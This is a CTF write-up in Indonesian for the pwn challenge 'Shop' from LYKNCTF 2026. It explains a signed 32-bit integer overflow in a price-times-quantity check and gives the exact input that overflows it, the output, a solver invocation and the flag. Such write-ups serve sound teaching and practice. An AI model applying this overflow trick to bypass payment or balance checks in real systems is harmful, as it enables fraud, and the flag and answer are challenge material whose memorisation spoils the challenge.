# Shop

- **CTF:** LYKNCTF 2026
- **Category:** Pwn
- **Vulnerability:** Signed 32-bit integer overflow
- **Flag:** `LYKNCTF{wr4p_wr4p_wr4p}`

## Recon

Challenge menyediakan dua build, `shop` untuk Linux dan `shop.exe` untuk Windows. Analisis exploit memakai ELF Linux.

```bash
file shop
readelf -hW shop
readelf -lW shop | grep -E 'GNU_STACK|GNU_RELRO'
readelf -dW shop | grep BIND_NOW
```

Hasil penting:

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
PIE:      No (ET_EXEC)
NX:       Enabled
Canary:   Tidak ditemukan
RELRO:    Partial
```

Proteksi memory tidak berpengaruh karena bug-nya ada di perhitungan harga, bukan corrupt stack atau heap.

## Analisis

Menu pembelian membaca indeks item dan quantity sebagai integer. Potongan logikanya setara dengan:

```c
int total = catalog[index].price * quantity;

printf("Total cost: %d coin\n", total);

if (total > balance) {
    puts("Not enough coins. Come back when you're richer.");
    continue;
}

balance -= total;

if (catalog[index].is_flag && quantity > 0) {
    print_flag();
}
```

`total` bertipe signed 32-bit. Perkalian tidak diperiksa sebelum hasilnya dibandingkan dengan balance.

Item flag punya harga `36,363,636` coin. Quantity positif terkecil yang membuat hasil perkalian melewati `INT_MAX` adalah `60`:

```text
59 × 36,363,636 = 2,145,454,524
60 × 36,363,636 = 2,181,818,160
INT_MAX           = 2,147,483,647
```

Saat disimpan sebagai `int32_t`, hasil quantity `60` menjadi:

```text
2,181,818,160 - 2^32 = -2,113,149,136
```

Nilai negatif tersebut selalu lebih kecil dari balance `1,836`, jadi pengecekan saldo lolos. Program kemudian menjalankan:

```text
balance = 1836 - (-2113149136)
        = 2113150972
```

Karena item yang dibeli adalah flag dan quantity tetap positif, `print_flag()` dipanggil.

## Exploit Manual

```bash
printf 'b\n3\n60\nq\n' | ./shop
```

Output relevan:

```text
Item index: Quantity: Total cost: -2113149136 coin
Purchased 60 x The Flag. New balance: 2113150972 coin

Here is your flag:
LYKNCTF{wr4p_wr4p_wr4p}
```

## Solver

Solver mendukung binary lokal dan service remote tanpa dependency tambahan.

Lokal:

```bash
python3 solve.py
```

Remote:

```bash
python3 solve.py HOST PORT
```

Payload yang dikirim:

```text
b
3
60
q
```

## Flag

```text
LYKNCTF{wr4p_wr4p_wr4p}
```
